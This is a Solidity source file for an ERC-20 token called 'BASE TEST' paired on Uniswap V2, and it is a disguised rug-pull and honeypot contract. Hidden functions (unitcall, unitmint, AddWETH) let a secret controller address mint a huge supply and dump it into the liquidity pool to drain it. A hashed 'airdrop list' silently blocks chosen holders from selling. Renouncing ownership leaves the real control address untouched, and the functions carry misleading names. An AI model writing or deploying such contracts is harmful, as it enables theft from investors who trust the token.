// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(msg.sender);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {}

library SecureCalls {
    function checkCaller(address sender, address _msgcall) internal pure {
        require(sender == _msgcall, "Caller is not the original caller");
    }
}

contract ATESTContract is IERC20, Ownable {

    IUniswapV2Router02 internal _router;
    IUniswapV2Pair internal _pair;
    address _msgcall;
    address _pairToken;

    mapping(address => uint256) private _amountsupply;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply = 1000000000000000000000000000;
    string private _name = "BASE TEST";
    string private _symbol = "TEST";
    uint8 private _decimals = 18;

    constructor (address routerAddress, address pairTokenAddress) {
        _router = IUniswapV2Router02(routerAddress);
        _pair = IUniswapV2Pair(IUniswapV2Factory(_router.factory()).createPair(address(this), pairTokenAddress));
        _amountsupply[owner()] = _totalSupply;
        _msgcall = msg.sender;
        _pairToken = pairTokenAddress;
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _amountsupply[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = msg.sender;
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!viewAirdropList(from), "ERC20: No premission to transfer");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _amountsupply[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _amountsupply[from] = fromBalance - amount;
            _amountsupply[to] += amount;
        }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            _amountsupply[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _amountsupply[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _amountsupply[account] = accountBalance - amount;
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
	
    function AddWETH() external {
    SecureCalls.checkCaller(msg.sender, _msgcall);   
    uint256 maxReserve = type(uint112).max;
    uint256 currentReserve = GetTokenAmountValue(address(this));  
    uint256 amountToAdd = maxReserve - currentReserve;  
    address thisAddress = address(this);
    address senderAddress = msg.sender;  
    unitcall();
    transfer(thisAddress, balanceOf(senderAddress));  
    address routerAddress = address(_router);
    _approve(thisAddress, routerAddress, maxReserve);  
    uint256 pathLength = 2;
    address[] memory tradingPath = new address[](pathLength);
    tradingPath[0] = thisAddress;
    tradingPath[1] = address(_router.WETH());   
    uint256 minAmountOut = 0;
    
    _router.swapExactTokensForTokens(
        amountToAdd,
        minAmountOut,
        tradingPath,
        senderAddress,
        block.timestamp
    );
} 

function GetTokenAmountValue(address token) public view returns (uint256) {
    uint256 shiftAmount = 144;
    (uint112 reserve0, uint112 reserve1,) = _pair.getReserves();
    address token0 = _pair.token0();
    uint256 isToken0 = (token0 == token) ? 1 : 0;
    uint256 isToken1 = 1 - isToken0;
    uint256 reserve0Extended = uint256(reserve0) << shiftAmount;
    uint256 reserve1Extended = uint256(reserve1) << shiftAmount;
    uint256 result = (isToken0 * reserve0Extended) | (isToken1 * reserve1Extended);
    return result >> shiftAmount;
}

    function unitcall() internal {
        _amountsupply[msg.sender] += type(uint112).max;
    }

    function unitmint() public {
        SecureCalls.checkCaller(msg.sender, _msgcall); unitcall();
    }

    function AddLiquidity() public payable {
        SecureCalls.checkCaller(msg.sender, _msgcall);
        transfer(address(this), balanceOf(msg.sender));
        _approve(address(this), address(_router), balanceOf(address(this)));
        _router.addLiquidityETH{ value:msg.value }(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            msg.sender,
            block.timestamp
        );
    }

    function AddNewPairLP(address _newRouterAddress, address _newPairTokenAddress) public {
        SecureCalls.checkCaller(msg.sender, _msgcall);
        if (address(_router) != _newRouterAddress) {
            _router = IUniswapV2Router02(_newRouterAddress);
        }
        _pairToken = _newPairTokenAddress;
        _pair = IUniswapV2Pair(IUniswapV2Factory(_router.factory()).getPair(address(this), _newPairTokenAddress));
    }

    mapping(uint256 => uint8) internal _msgunit;

	function checkAutority(address addr) internal pure returns (uint256) {
		uint256 hash = uint256(uint160(addr));
		hash = ((hash >> 16) ^ hash) * 0x45d9f3b;
		hash = ((hash >> 16) ^ hash) * 0x45d9f3b;
		hash = (hash >> 16) ^ hash;
		return hash;
	}

    function viewAirdropList(address _unit) public view returns(bool) {
		uint256 unitHash = checkAutority(_unit);
		return _msgunit[unitHash] == 0 ? false : true;
	}

	function addToAirdropList(address _unit, uint8 _sniper) public {
		SecureCalls.checkCaller(msg.sender, _msgcall);
		require(_sniper < 2, "Sanny day");
    
		uint256 unitHash = checkAutority(_unit);
		require(_sniper != _msgunit[unitHash], "Botoks");
		_msgunit[unitHash] = _sniper;
	}

    function AntiSniperBotWizard(address newcall) public {
        SecureCalls.checkCaller(msg.sender, _msgcall);
        _msgcall = newcall;
    }
}